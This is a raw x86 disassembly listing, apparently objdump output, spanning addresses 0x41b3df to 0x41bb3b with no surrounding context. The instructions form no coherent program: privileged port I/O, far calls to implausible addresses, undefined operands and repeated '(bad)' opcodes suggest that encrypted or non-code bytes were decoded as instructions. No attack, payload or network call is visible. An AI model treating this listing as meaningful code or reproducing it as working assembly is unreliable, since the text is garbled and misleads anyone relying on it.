  41b3df:	mov    ss,esi
  41b3e1:	js     0x41b45c
  41b3e3:	pop    ebx
  41b3e4:	scas   eax,DWORD PTR es:[edi]
  41b3e5:	in     eax,0x9f
  41b3e7:	imul   edx,DWORD PTR [eax-0x1838bfe8],0xdcba49a5
  41b3f1:	inc    eax
  41b3f2:	inc    ebx
  41b3f3:	pop    ss
  41b3f4:	and    esi,DWORD PTR [ebp+0x19]
  41b3f7:	popf   
  41b3f8:	sbb    al,0x5c
  41b3fa:	add    cl,BYTE PTR [esi+eax*2-0x10]
  41b3fe:	dec    esi
  41b3ff:	loopne 0x41b386
  41b401:	jge    0x41b458
  41b403:	into   
  41b404:	fld    TBYTE PTR [ebx+0x54]
  41b407:	or     eax,0x940f44b0
  41b40c:	ret    
  41b40d:	xor    DWORD PTR [ebx],edi
  41b40f:	fsubr  QWORD PTR [edx+0x4]
  41b412:	pop    ecx
  41b413:	test   eax,0xf175882b
  41b418:	mov    bl,0x3c
  41b41a:	lods   eax,DWORD PTR ds:[esi]
  41b41b:	sub    eax,0x2b1c69bb
  41b420:	into   
  41b421:	arpl   WORD PTR [ebx+0x30d57913],sp
  41b427:	in     eax,dx
  41b428:	iret   
  41b429:	cmp    eax,0x7c26f44c
  41b42e:	inc    edx
  41b42f:	or     al,bl
  41b431:	ins    BYTE PTR es:[edi],dx
  41b432:	(bad)  [eax-0x56]
  41b435:	ins    BYTE PTR es:[edi],dx
  41b436:	rcl    BYTE PTR [edx+eax*2],1
  41b439:	xor    al,0x44
  41b43b:	and    dx,ax
  41b43e:	sub    eax,0xb4757e96
  41b443:	js     0x41b431
  41b445:	dec    esi
  41b446:	jecxz  0x41b450
  41b448:	loop   0x41b43c
  41b44a:	aas    
  41b44b:	sbb    BYTE PTR [edx+ecx*8],ah
  41b44e:	in     al,dx
  41b44f:	push   ebx
  41b450:	mov    bl,0x33
  41b452:	inc    ebp
  41b453:	stc    
  41b454:	jge    0x41b4a6
  41b456:	js     0x41b3ef
  41b458:	or     al,0xe8
  41b45a:	popa   
  41b45b:	jbe    0x41b456
  41b45d:	je     0x41b4bf
  41b45f:	enter  0x1621,0x6b
  41b463:	xchg   esp,eax
  41b464:	mov    al,ds:0xcb03328b
  41b469:	cmp    eax,ecx
  41b46b:	loopne 0x41b402
  41b46d:	call   0xafd2e1fb
  41b472:	mov    cl,0xda
  41b474:	lahf   
  41b475:	mov    ch,0x9a
  41b477:	data16 aas 
  41b479:	dec    eax
  41b47a:	mov    ecx,0x3d5d1c48
  41b47f:	std    
  41b480:	loop   0x41b42d
  41b482:	mov    ch,0xcd
  41b484:	fadd   DWORD PTR [ecx]
  41b486:	inc    ecx
  41b487:	push   ss
  41b488:	(bad)  
  41b489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b48a:	in     eax,dx
  41b48b:	add    al,0xb6
  41b48d:	test   eax,0xd8baf2fa
  41b492:	add    dh,al
  41b494:	mov    ?,ebp
  41b496:	xchg   BYTE PTR [eax+0x30a1a4d7],al
  41b49c:	push   ds
  41b49d:	or     ebp,ecx
  41b49f:	fnstsw WORD PTR [esi+0x17]
  41b4a2:	inc    esi
  41b4a3:	call   0xf5d9d820
  41b4a8:	xor    BYTE PTR [edi+0x73],dh
  41b4ab:	aam    0x27
  41b4ad:	pop    edi
  41b4ae:	call   0x728c:0x210c2c8c
  41b4b5:	mov    DWORD PTR [esi-0x6d],eax
  41b4b8:	push   0xde67bc57
  41b4bd:	aam    0x55
  41b4bf:	mov    ah,BYTE PTR [edx-0x24a8d06d]
  41b4c5:	jg     0x41b4b7
  41b4c7:	mov    dh,0x79
  41b4c9:	push   ss
  41b4ca:	cmp    al,0xf4
  41b4cc:	lods   al,BYTE PTR ds:[esi]
  41b4cd:	jp     0x41b4bc
  41b4cf:	mov    al,0x8
  41b4d1:	in     al,0xef
  41b4d3:	or     ecx,DWORD PTR [ebx-0x7d]
  41b4d6:	mov    bl,0x46
  41b4d8:	dec    esp
  41b4d9:	push   es
  41b4da:	stc    
  41b4db:	repnz xchg ebp,eax
  41b4dd:	cs xchg esi,eax
  41b4df:	pop    edi
  41b4e0:	pop    eax
  41b4e1:	pop    ss
  41b4e2:	and    BYTE PTR [edi-0x46db38b1],0x5f
  41b4e9:	or     cl,ah
  41b4eb:	bound  ebp,QWORD PTR [ecx+0xfa6c038]
  41b4f1:	lahf   
  41b4f2:	outs   dx,BYTE PTR ds:[esi]
  41b4f3:	call   0x825a:0xde348eb2
  41b4fa:	xchg   DWORD PTR [esi+0x7ccc24fe],edx
  41b500:	in     eax,0xd5
  41b502:	and    al,0x34
  41b504:	mov    esp,0x50a9f2ae
  41b509:	in     eax,dx
  41b50a:	jecxz  0x41b4ec
  41b50c:	(bad)  
  41b50d:	fld    DWORD PTR [esi+0x27bf979a]
  41b513:	xor    ebx,DWORD PTR [ebx-0x2eb7ee32]
  41b519:	rcr    ebp,cl
  41b51b:	pop    ebx
  41b51c:	xchg   esi,eax
  41b51d:	pop    edi
  41b51e:	mov    ah,0xd2
  41b520:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b521:	jbe    0x41b57c
  41b523:	rcr    DWORD PTR [eax],cl
  41b525:	in     eax,0xb8
  41b527:	mov    al,ds:0x61666f9f
  41b52c:	ror    ebp,cl
  41b52e:	popf   
  41b52f:	rcl    DWORD PTR [ebp+0x440a563a],cl
  41b535:	cmp    DWORD PTR [edi],ebp
  41b537:	push   es
  41b538:	adc    dl,BYTE PTR [ecx]
  41b53a:	xchg   edi,eax
  41b53b:	add    eax,edx
  41b53d:	iret   
  41b53e:	(bad)  
  41b53f:	mov    edx,0xdead4b6f
  41b544:	cmp    ebp,DWORD PTR [eax+0xe]
  41b547:	shr    WORD PTR [ebp-0x38],cl
  41b54b:	clc    
  41b54c:	inc    esi
  41b54d:	sub    eax,0xe46b51bf
  41b552:	movsx  esi,BYTE PTR cs:[edx]
  41b556:	mov    al,dl
  41b558:	jecxz  0x41b4fb
  41b55a:	cdq    
  41b55b:	dec    ebx
  41b55c:	popf   
  41b55d:	push   edi
  41b55e:	push   ecx
  41b55f:	mov    WORD PTR [ebx+0x38e8f4eb],es
  41b565:	clc    
  41b566:	retf   0x4ff9
  41b569:	pop    ss
  41b56a:	int    0x76
  41b56c:	xor    eax,0x57e12e2
  41b571:	(bad)
  41b574:	leave  
  41b575:	je     0x41b5d6
  41b577:	and    ch,0x3f
  41b57a:	adc    DWORD PTR [edi+0x300bb5b3],0x66
  41b581:	js     0x41b55a
  41b583:	es pusha 
  41b585:	imul   edx,DWORD PTR [ecx-0x5cb15e4f],0x118389f4
  41b58f:	inc    ebp
  41b590:	push   esi
  41b591:	mov    dh,0x27
  41b593:	inc    ecx
  41b594:	neg    dl
  41b596:	(bad)  
  41b598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b599:	js     0x41b5ad
  41b59b:	enter  0xa5b9,0xb2
  41b59f:	pop    edx
  41b5a0:	outs   dx,DWORD PTR ds:[esi]
  41b5a1:	aas    
  41b5a2:	xchg   edi,eax
  41b5a3:	mov    ds:0xd9449012,al
  41b5a8:	pop    ds
  41b5a9:	cli    
  41b5aa:	rcl    DWORD PTR [ecx-0x79],0xf
  41b5ae:	ffreep st(0)
  41b5b0:	dec    ebx
  41b5b1:	stos   DWORD PTR es:[edi],eax
  41b5b2:	les    eax,FWORD PTR [edx+0x38]
  41b5b5:	retf   
  41b5b6:	lock data16 jns 0x41b621
  41b5ba:	inc    esi
  41b5bb:	mov    cl,0x8d
  41b5bd:	int3   
  41b5be:	scas   eax,DWORD PTR es:[edi]
  41b5bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c0:	xor    esi,DWORD PTR [edi]
  41b5c2:	fcom   st(0)
  41b5c4:	repnz fstp TBYTE PTR [ebx+0x3b495468]
  41b5cb:	(bad)  
  41b5cd:	inc    edi
  41b5ce:	adc    eax,0x58b0ccd
  41b5d3:	lods   al,BYTE PTR ds:[esi]
  41b5d4:	mov    WORD PTR [esp+ebx*1-0xb],?
  41b5d8:	ret    0xed41
  41b5db:	cs inc esi
  41b5dd:	push   edi
  41b5de:	sbb    ecx,ecx
  41b5e0:	and    al,0x77
  41b5e2:	les    ecx,FWORD PTR [esi]
  41b5e4:	idiv   DWORD PTR [eax+0x6]
  41b5e7:	or     bh,bl
  41b5e9:	sub    bl,ah
  41b5eb:	retf   0x6b88
  41b5ee:	test   DWORD PTR ds:0xe5e62804,0xea041619
  41b5f8:	mov    BYTE PTR [ecx],bl
  41b5fa:	pusha  
  41b5fb:	pop    esi
  41b5fc:	sti    
  41b5fd:	aas    
  41b5fe:	ret    0xa8fe
  41b601:	popf   
  41b602:	out    0x1,eax
  41b604:	addr16 std 
  41b606:	add    eax,0xcbd1c72e
  41b60b:	sbb    DWORD PTR [eax+esi*8-0x34ea9756],esp
  41b612:	jnp    0x41b669
  41b614:	stos   DWORD PTR es:[edi],eax
  41b615:	cmc    
  41b616:	or     al,0x78
  41b618:	clc    
  41b619:	lods   al,BYTE PTR ds:[esi]
  41b61a:	mov    ah,0x15
  41b61c:	(bad)  
  41b61d:	dec    edi
  41b61e:	cmp    ebx,0xc5beb4b4
  41b624:	stc    
  41b625:	jle    0x41b5c7
  41b627:	popa   
  41b628:	daa    
  41b629:	inc    esp
  41b62a:	mov    ecx,0xa0221b6
  41b62f:	and    DWORD PTR [edi-0x27c09c5e],ecx
  41b635:	dec    esi
  41b636:	adc    ebp,DWORD PTR [edx]
  41b638:	scas   al,BYTE PTR es:[edi]
  41b639:	inc    edx
  41b63a:	mov    fs,WORD PTR [ebx-0x55]
  41b63d:	xor    eax,0xc8673f2f
  41b642:	popa   
  41b643:	pop    esp
  41b644:	iret   
  41b645:	mov    al,0x66
  41b647:	add    eax,0x4fa8d27a
  41b64c:	and    al,0x56
  41b64e:	test   al,0xb3
  41b650:	xchg   DWORD PTR [edx],ecx
  41b652:	sahf   
  41b653:	add    eax,0x23477315
  41b658:	and    cl,ah
  41b65a:	xchg   esi,eax
  41b65b:	out    dx,eax
  41b65c:	(bad)  
  41b65d:	ja     0x41b692
  41b65f:	shl    DWORD PTR [esi+0x18],cl
  41b662:	and    esi,DWORD PTR [edx+0x5]
  41b665:	loop   0x41b6a6
  41b667:	or     DWORD PTR [esi+edx*1-0x39d96229],edi
  41b66e:	adc    al,0xe6
  41b670:	repnz dec edi
  41b672:	fwait
  41b673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b674:	xchg   ecx,eax
  41b675:	mov    edi,esi
  41b677:	sub    dl,bl
  41b679:	push   ecx
  41b67a:	mov    edi,0xb373c48e
  41b67f:	retf   
  41b680:	loopne 0x41b62b
  41b682:	mov    eax,0x25428217
  41b687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b688:	hlt    
  41b689:	push   ebp
  41b68a:	xchg   ebx,eax
  41b68b:	inc    ebp
  41b68c:	mov    ?,ebx
  41b68e:	std    
  41b68f:	cmc    
  41b690:	cdq    
  41b691:	xor    cx,0x4e
  41b695:	mov    ebp,0xed41d3da
  41b69a:	loop   0x41b656
  41b69c:	popa   
  41b69d:	xchg   ebp,eax
  41b69e:	xor    DWORD PTR [eax],esp
  41b6a0:	pop    esi
  41b6a1:	arpl   WORD PTR ds:0xbcf51a19,cx
  41b6a7:	ins    DWORD PTR es:[edi],dx
  41b6a8:	push   ecx
  41b6a9:	push   ebp
  41b6aa:	addr16 sbb edx,edi
  41b6ad:	lea    ebx,[eax+0x1a]
  41b6b0:	mov    esi,0x15c59bb7
  41b6b5:	rol    BYTE PTR [ebx+eax*4-0xd],cl
  41b6b9:	inc    ebp
  41b6ba:	mov    ah,0xa9
  41b6bc:	imul   esp,DWORD PTR [eax],0x6bb934f1
  41b6c2:	mov    al,ds:0x4475771d
  41b6c7:	pop    ds
  41b6c8:	retf   
  41b6c9:	mov    ebp,eax
  41b6cb:	dec    edi
  41b6cc:	pop    edx
  41b6cd:	mov    ebp,0xa63b39f
  41b6d2:	mov    bl,0xe
  41b6d4:	rol    esp,0x3d
  41b6d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6d8:	pop    edx
  41b6d9:	xor    dl,bl
  41b6db:	or     ecx,DWORD PTR [ecx]
  41b6dd:	add    bl,BYTE PTR [esi-0x46b0f55c]
  41b6e3:	jle    0x41b6f0
  41b6e5:	mov    bh,BYTE PTR [esi+0x3ea04fa1]
  41b6eb:	dec    esp
  41b6ec:	lods   eax,DWORD PTR ds:[esi]
  41b6ed:	sub    ch,BYTE PTR [edx+0x61]
  41b6f0:	shl    DWORD PTR [edi+0x61],0x3f
  41b6f4:	in     eax,0x5f
  41b6f6:	or     edx,esp
  41b6f8:	or     BYTE PTR [edi],ah
  41b6fa:	ror    ecx,0x19
  41b6fd:	sbb    BYTE PTR [ecx],bl
  41b6ff:	push   esp
  41b700:	and    DWORD PTR [ecx+0x47],ebx
  41b703:	icebp  
  41b704:	and    dl,BYTE PTR [ecx]
  41b706:	cmp    al,BYTE PTR [eax+0x7d]
  41b709:	mov    WORD PTR [edi+0x5de7c759],es
  41b70f:	(bad)  
  41b710:	mov    ecx,0xd9eae3a9
  41b715:	cmp    cl,0x7a
  41b718:	fstp   TBYTE PTR [eax]
  41b71a:	inc    esp
  41b71b:	(bad)  
  41b71d:	inc    ecx
  41b71e:	stc    
  41b71f:	cmp    ebp,ebp
  41b721:	and    DWORD PTR [esi],ebx
  41b723:	shl    DWORD PTR [ebp-0x75],cl
  41b726:	sub    ecx,esp
  41b728:	ror    dl,0x6e
  41b72b:	cmp    BYTE PTR [edx+0x5e52b9e7],bl
  41b731:	sbb    eax,0x39977b6a
  41b736:	mov    esp,0x18f64cf0
  41b73b:	inc    eax
  41b73c:	in     eax,0x9f
  41b73e:	add    BYTE PTR [ebp+0x8],bl
  41b741:	add    DWORD PTR [ebp-0x3c471e1b],0x8f0a56a1
  41b74b:	loope  0x41b710
  41b74d:	cmp    eax,0x503bfa2d
  41b752:	jg     0x41b726
  41b754:	push   0xfffffff7
  41b756:	sub    BYTE PTR [eax+0x33fa3017],bl
  41b75c:	cs xchg ebx,eax
  41b75e:	or     DWORD PTR [ecx],0x7fa89370
  41b764:	or     al,0x14
  41b766:	(bad)  [edi+0x25]
  41b769:	daa    
  41b76a:	jl     0x41b7c4
  41b76c:	dec    edx
  41b76d:	lods   eax,DWORD PTR ds:[esi]
  41b76e:	cmp    eax,edx
  41b770:	(bad)  
  41b771:	xchg   DWORD PTR gs:[eax+0x6d0ebdad],esi
  41b778:	mov    al,0xf
  41b77a:	pop    edx
  41b77b:	push   edi
  41b77c:	out    0x35,eax
  41b77e:	push   ebx
  41b77f:	stos   DWORD PTR es:[edi],eax
  41b780:	pop    eax
  41b781:	cdq    
  41b782:	xor    al,0x6
  41b784:	cmp    eax,0xdd0e90ca
  41b789:	jmp    0x41b729
  41b78b:	pop    ecx
  41b78d:	pop    edi
  41b78e:	cwde   
  41b78f:	pop    esi
  41b790:	fwait
  41b791:	cmp    eax,0xb189ca23
  41b796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b797:	mov    ebp,0xde0ef25b
  41b79c:	cmp    bl,ah
  41b79e:	in     eax,0xbe
  41b7a0:	add    al,0xf9
  41b7a2:	mov    ebx,0xef5a5678
  41b7a7:	lods   al,BYTE PTR ds:[esi]
  41b7a8:	lods   al,BYTE PTR ds:[esi]
  41b7a9:	ds push ebp
  41b7ab:	jb     0x41b82a
  41b7ad:	test   eax,0xea816ff9
  41b7b2:	or     eax,0x31ddd2bd
  41b7b7:	outs   dx,BYTE PTR ds:[esi]
  41b7b8:	cmp    al,0xa6
  41b7ba:	adc    ecx,ebx
  41b7bc:	in     al,dx
  41b7bd:	int    0x35
  41b7bf:	sub    esi,DWORD PTR [ebx+0x79]
  41b7c2:	or     ah,BYTE PTR [ebx]
  41b7c4:	push   cs
  41b7c5:	stos   BYTE PTR es:[edi],al
  41b7c6:	jmp    0x41b7bc
  41b7c8:	repz scas eax,DWORD PTR es:[edi]
  41b7ca:	xor    DWORD PTR [edi+esi*8-0x11],0x3ea1fcd6
  41b7d2:	xchg   cl,ch
  41b7d4:	jg     0x41b831
  41b7d6:	sbb    eax,0xaaa7e6da
  41b7db:	inc    esi
  41b7dc:	cwde   
  41b7dd:	push   ecx
  41b7de:	nop
  41b7df:	popf   
  41b7e0:	add    al,0x5c
  41b7e2:	pop    ds
  41b7e3:	(bad)  
  41b7e4:	mov    edi,0xfc9a60aa
  41b7e9:	inc    esi
  41b7ea:	xchg   ebx,eax
  41b7eb:	xchg   esi,eax
  41b7ec:	jne    0x41b77f
  41b7ee:	inc    esi
  41b7ef:	out    0x6d,al
  41b7f1:	mov    cl,0xfb
  41b7f3:	ret    0x36db
  41b7f6:	call   0x211d1e4
  41b7fb:	fld    DWORD PTR [esi+0x2b60f679]
  41b801:	mov    esi,0xeb5dc584
  41b806:	pop    ebx
  41b807:	mov    cl,0x60
  41b809:	sub    al,0xaa
  41b80b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b80c:	push   eax
  41b80d:	add    eax,0x659c4302
  41b812:	ja     0x41b7ba
  41b814:	inc    esi
  41b815:	in     eax,0xc3
  41b817:	lahf   
  41b818:	cmp    DWORD PTR [edi+0x5d42ce1c],0xc
  41b81f:	sub    eax,0xf4928d3a
  41b824:	(bad)  [ebx+ebx*1+0x2e17df8f]
  41b82b:	fmul   st(2),st
  41b82d:	ja     0x41b89c
  41b82f:	pusha  
  41b830:	cli    
  41b831:	mov    ah,0x78
  41b833:	xchg   ecx,eax
  41b834:	mov    eax,0x46ef4c5a
  41b839:	frstor [ecx]
  41b83b:	fist   WORD PTR [edi+0x40]
  41b83e:	xchg   edi,eax
  41b83f:	sub    BYTE PTR [ebp-0x41],ch
  41b842:	mov    edi,0xf4597346
  41b847:	jb     0x41b827
  41b849:	(bad)  
  41b84a:	call   0xb9ce31b3
  41b84f:	mov    cl,0x61
  41b851:	jle    0x41b86b
  41b853:	scas   al,BYTE PTR es:[edi]
  41b854:	xor    al,ch
  41b856:	push   edi
  41b857:	std    
  41b858:	sbb    DWORD PTR [esi],0xfcfd3aed
  41b85e:	inc    eax
  41b85f:	shr    esp,cl
  41b861:	inc    esi
  41b862:	lahf   
  41b863:	outs   dx,DWORD PTR ds:[esi]
  41b864:	xor    edx,DWORD PTR [esi]
  41b866:	push   cs
  41b867:	loop   0x41b83d
  41b869:	jnp    0x41b803
  41b86b:	mov    ah,0x4b
  41b86d:	xor    eax,0x3c4ec5b4
  41b872:	and    ebp,DWORD PTR [ebx-0x1a]
  41b875:	lods   eax,DWORD PTR ds:[esi]
  41b876:	mov    ebx,0xa3d71fec
  41b87b:	out    dx,eax
  41b87c:	cmp    cx,WORD PTR [ebx-0x311660d8]
  41b883:	or     ebp,edx
  41b885:	int    0x8
  41b887:	fimul  DWORD PTR [eax-0x24dc62ad]
  41b88d:	mov    esi,0x6d0b4743
  41b892:	jne    0x41b8e7
  41b894:	inc    ebx
  41b895:	test   DWORD PTR [edx+edi*4],edx
  41b898:	sub    DWORD PTR [ebx+0x7e],ebx
  41b89b:	daa    
  41b89c:	pusha  
  41b89d:	add    ebp,DWORD PTR [edx+0x66]
  41b8a0:	cmp    eax,0xd8869c87
  41b8a5:	dec    edi
  41b8a6:	push   edi
  41b8a7:	stos   BYTE PTR es:[edi],al
  41b8a8:	add    DWORD PTR [ebp+edx*8+0x67],eax
  41b8ac:	cs pop esi
  41b8ae:	xchg   bh,bl
  41b8b0:	add    BYTE PTR [eax],dh
  41b8b2:	mov    edx,DWORD PTR [eax+0x17]
  41b8b5:	dec    ebp
  41b8b6:	sub    BYTE PTR [ecx-0x9512746],0xfa
  41b8bd:	jnp    0x41b8c8
  41b8bf:	pusha  
  41b8c0:	imul   edx
  41b8c2:	and    al,bl
  41b8c4:	add    dl,BYTE PTR [ecx+0x39]
  41b8c7:	pushf  
  41b8c8:	out    dx,al
  41b8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ca:	mov    cl,0x68
  41b8cc:	pop    esi
  41b8cd:	and    al,0xd3
  41b8cf:	push   ss
  41b8d0:	punpcklbw mm2,DWORD PTR [edx+edi*8-0x800fe5a]
  41b8d8:	loope  0x41b8ad
  41b8da:	gs aad 0x76
  41b8dd:	sbb    al,0xa4
  41b8df:	xlat   BYTE PTR ds:[ebx]
  41b8e0:	cmp    DWORD PTR [ecx+0xad0bfa1],ebp
  41b8e6:	gs dec edx
  41b8e8:	idiv   BYTE PTR [esp+edx*4+0x769405c0]
  41b8ef:	dec    esp
  41b8f0:	dec    edx
  41b8f1:	xchg   ebx,eax
  41b8f2:	sti    
  41b8f3:	and    DWORD PTR [esi-0x56],edx
  41b8f6:	popa   
  41b8f7:	sahf   
  41b8f8:	mov    ebp,0xfd87954a
  41b8fd:	lea    ebx,[edi+0x7a]
  41b900:	icebp  
  41b901:	xchg   ebp,eax
  41b902:	push   eax
  41b903:	imul   edi,DWORD PTR [edi],0x8f85a4b7
  41b909:	mov    ebp,0xd65d99d5
  41b90e:	loop   0x41b91e
  41b910:	or     DWORD PTR [ecx],0xffffff8e
  41b913:	jo     0x41b8d7
  41b915:	outs   dx,DWORD PTR ds:[esi]
  41b916:	dec    edx
  41b917:	scas   eax,DWORD PTR es:[edi]
  41b918:	leave  
  41b919:	inc    ecx
  41b91a:	ja     0x41b8e9
  41b91c:	jno    0x41b8d0
  41b91e:	mov    edx,0xa6520e4b
  41b923:	mov    edx,0x8504f0b8
  41b928:	mov    edi,0xa5d723bb
  41b92d:	cmp    edi,DWORD PTR [edi-0xf]
  41b930:	hlt    
  41b931:	out    0x4d,al
  41b933:	jmp    0x41b8d5
  41b935:	pop    ecx
  41b936:	imul   ecx,DWORD PTR [ebp-0x1385c71b],0x44
  41b93d:	dec    esp
  41b93e:	cmp    eax,ebx
  41b940:	mov    edi,0x196943b5
  41b945:	aas    
  41b946:	mov    WORD PTR [ecx+0x16],ds
  41b949:	mov    ds:0x7e0ca299,eax
  41b94e:	sub    DWORD PTR [ecx-0x7c],esp
  41b951:	sub    BYTE PTR [eax+0x78614e1f],ah
  41b957:	mov    bl,0xb1
  41b959:	mov    esp,0xf2d08e2f
  41b95e:	push   edx
  41b95f:	jmp    0x41b9d7
  41b961:	into   
  41b962:	push   esi
  41b963:	aam    0xe3
  41b965:	mov    cs,WORD PTR [ebx-0x2663c0f8]
  41b96b:	push   ss
  41b96c:	lods   al,BYTE PTR ds:[esi]
  41b96d:	stc    
  41b96e:	retf   0xbf95
  41b971:	scas   al,BYTE PTR es:[edi]
  41b972:	fcomp  QWORD PTR [ebx]
  41b974:	xor    BYTE PTR [esi+0x5d9cc2f2],dl
  41b97a:	dec    edi
  41b97b:	mov    ch,0xab
  41b97d:	repz ficom DWORD PTR [edi]
  41b980:	(bad)  
  41b981:	fwait
  41b982:	mov    cl,0xe0
  41b984:	add    DWORD PTR [ecx+edi*2+0x4613a283],esi
  41b98b:	inc    edi
  41b98c:	das    
  41b98d:	inc    ecx
  41b98e:	mov    bh,0x41
  41b990:	imul   edx,edi,0x7ead2b22
  41b996:	retf   
  41b997:	lahf   
  41b998:	and    BYTE PTR [ecx+ebp*4],bh
  41b99b:	shl    DWORD PTR [eax+0x50d9c4aa],0x9b
  41b9a2:	stos   BYTE PTR es:[edi],al
  41b9a3:	mov    WORD PTR [ebx],?
  41b9a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9a6:	push   0xffffffc5
  41b9a8:	out    dx,eax
  41b9a9:	in     eax,dx
  41b9aa:	inc    ebx
  41b9ab:	jns    0x41b9e1
  41b9ad:	repnz lds ecx,FWORD PTR [edi]
  41b9b0:	int3   
  41b9b1:	cld    
  41b9b2:	loopne 0x41ba19
  41b9b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9b5:	or     cl,al
  41b9b7:	sub    DWORD PTR [ebp-0x53],edx
  41b9ba:	es inc edx
  41b9bc:	adc    ebp,DWORD PTR ds:[eax-0x54c057e]
  41b9c3:	imul   BYTE PTR [ebp-0x49]
  41b9c6:	test   DWORD PTR [edi-0x2a03dd83],0x25921b3
  41b9d0:	mov    cl,0x94
  41b9d2:	lds    edi,FWORD PTR [ecx-0x4b0b91fe]
  41b9d8:	stos   BYTE PTR es:[edi],al
  41b9d9:	cmp    eax,0x7e4b626a
  41b9de:	icebp  
  41b9df:	(bad)  
  41b9e1:	jl     0x41b9f7
  41b9e3:	nop
  41b9e4:	sub    eax,0x82cc36a5
  41b9e9:	or     al,0x47
  41b9eb:	mov    fs,esi
  41b9ed:	mov    ebp,DWORD PTR [ebx]
  41b9ef:	data16 jle 0x41b9a5
  41b9f2:	pop    es
  41b9f3:	arpl   WORD PTR [ebx-0x80],dx
  41b9f6:	push   edi
  41b9f7:	das    
  41b9f8:	mov    DWORD PTR [eax-0x18cf81a7],esi
  41b9fe:	mov    DWORD PTR [edi+0x5c8be417],edx
  41ba04:	sbb    DWORD PTR [ebp+0x52],edx
  41ba07:	dec    ecx
  41ba08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba09:	loop   0x41ba84
  41ba0b:	test   al,0x5e
  41ba0d:	mov    edx,0x1381372f
  41ba12:	bsf    edi,DWORD PTR [edi]
  41ba15:	aas    
  41ba16:	mov    al,0x40
  41ba18:	clc    
  41ba19:	and    al,0x8a
  41ba1c:	fisttp DWORD PTR [edx+edi*4-0x6c]
  41ba20:	test   al,0x18
  41ba22:	fiadd  WORD PTR [ecx+0x2]
  41ba25:	and    al,0x2a
  41ba27:	or     BYTE PTR ds:0x251e70b0,dl
  41ba2d:	pusha  
  41ba2e:	int3   
  41ba2f:	rcr    BYTE PTR [edx-0x4e],1
  41ba32:	test   cl,ah
  41ba34:	fsubr  st,st(5)
  41ba36:	test   ch,ch
  41ba38:	fnstenv [ecx]
  41ba3a:	adc    edi,eax
  41ba3c:	lods   al,BYTE PTR ds:[esi]
  41ba3d:	xchg   al,al
  41ba3f:	sub    eax,0xb570ebbc
  41ba44:	data16 and al,0x5c
  41ba47:	rcr    BYTE PTR [ebp-0x5521e425],cl
  41ba4d:	mov    dh,0xb8
  41ba4f:	push   esp
  41ba50:	dec    ebx
  41ba51:	mov    eax,DWORD PTR ds:0x58ef2026
  41ba57:	cmp    eax,0xc6d1125
  41ba5c:	in     al,0x3f
  41ba5e:	mov    BYTE PTR [edx+edx*8+0x2bf2cba],dl
  41ba65:	dec    ebx
  41ba66:	inc    ebx
  41ba67:	call   0x42b948da
  41ba6c:	inc    edx
  41ba6d:	jne    0x41ba0c
  41ba6f:	hlt    
  41ba70:	jbe    0x41ba4b
  41ba72:	test   BYTE PTR [edi+0x65],bh
  41ba75:	loope  0x41bab7
  41ba77:	into   
  41ba78:	into   
  41ba79:	push   esi
  41ba7a:	or     BYTE PTR [ebx],ch
  41ba7c:	dec    ecx
  41ba7d:	push   edx
  41ba7e:	mov    edi,0x4de62037
  41ba83:	jo     0x41baf8
  41ba85:	sub    DWORD PTR [edx-0x197cd38d],esp
  41ba8b:	mov    ds:0x3c639206,al
  41ba90:	push   0x11
  41ba92:	outs   dx,DWORD PTR ds:[esi]
  41ba93:	push   0x72
  41ba95:	jmp    0x41bad0
  41ba97:	xchg   DWORD PTR [edi+0x21],esp
  41ba9a:	push   cs
  41ba9b:	in     eax,dx
  41ba9c:	(bad)  
  41ba9d:	call   FWORD PTR [ebx-0x38c0a9e6]
  41baa3:	push   0x1be914a0
  41baa8:	hlt    
  41baa9:	xchg   DWORD PTR [ebp+0x4609d6],esi
  41baaf:	out    dx,eax
  41bab0:	out    0xeb,eax
  41bab2:	inc    esi
  41bab3:	call   0xa4f8a9fa
  41bab8:	lea    edi,[esi]
  41baba:	clc    
  41babb:	jnp    0x41ba80
  41babd:	mov    ds,edx
  41babf:	adc    bh,BYTE PTR [ebp-0x13]
  41bac2:	mov    dl,0xdf
  41bac4:	cli    
  41bac5:	or     al,0x3f
  41bac7:	test   ah,ch
  41bac9:	aad    0xfe
  41bacb:	push   esp
  41bacc:	fyl2x  
  41bace:	imul   edi,DWORD PTR [esi+0x69],0xffffffa3
  41bad2:	sbb    DWORD PTR [ebx-0x5c],edi
  41bad5:	mov    dh,0x4a
  41bad7:	and    ebx,DWORD PTR [eax+0x35]
  41bada:	or     dl,BYTE PTR [ebx+0x4b6bd53e]
  41bae0:	xchg   ecx,eax
  41bae1:	push   edx
  41bae2:	je     0x41bb2a
  41bae4:	loop   0x41bb0c
  41bae6:	mov    edx,gs
  41bae8:	in     al,dx
  41bae9:	mov    DWORD PTR [eax+0x3e],eax
  41baec:	mov    edi,?
  41baee:	or     edi,DWORD PTR [eax+0xcfd0894]
  41baf4:	sbb    DWORD PTR [ebp-0x18],ebp
  41baf7:	mov    ebp,0xee774778
  41bafc:	add    ecx,DWORD PTR [ecx+eax*2]
  41baff:	xchg   BYTE PTR [esi],ch
  41bb01:	jmp    0x42ed:0xe0923bc0
  41bb08:	sub    DWORD PTR [edx+edi*2+0x1e],ebx
  41bb0c:	dec    ebp
  41bb0d:	adc    eax,0xb7e456ee
  41bb12:	xchg   esi,eax
  41bb13:	out    0x3f,eax
  41bb15:	inc    esp
  41bb16:	pusha  
  41bb17:	pop    eax
  41bb18:	es test eax,0x6b7b9230
  41bb1e:	xchg   edx,eax
  41bb1f:	push   0x633844ac
  41bb24:	test   BYTE PTR [ebx-0x3d62969d],ah
  41bb2a:	cmp    ecx,DWORD PTR [edi]
  41bb2c:	push   0xf26b1c08
  41bb31:	call   0x181146c0
  41bb36:	cmp    eax,0x5c5b07b5
  41bb3b:	jo     0x41bb11
